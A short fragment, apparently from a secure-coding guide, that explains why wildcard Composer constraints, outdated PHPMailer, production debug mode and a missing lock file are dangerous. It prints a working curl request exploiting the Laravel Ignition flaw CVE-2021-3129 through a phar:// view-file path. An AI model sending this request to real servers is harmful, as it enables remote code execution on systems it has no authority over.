**Attack Payload** (CVE-2021-3129):
```bash
# Ignition RCE exploit via file manipulation
curl -X POST "http://vulnerable-app.com/_ignition/execute-solution" \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "test",
      "viewFile": "phar://path/to/malicious.phar/test.txt"
    }
  }'
```

**Why This Is Dangerous**:
- Wildcard (*) version constraints allow any version including those with known CVEs
- PHPMailer 5.x has CVE-2016-10033 (RCE via mail parameters)
- Debug mode in production exposes sensitive error details and exploitable endpoints
- No composer.lock committed means different servers may have different vulnerable versions

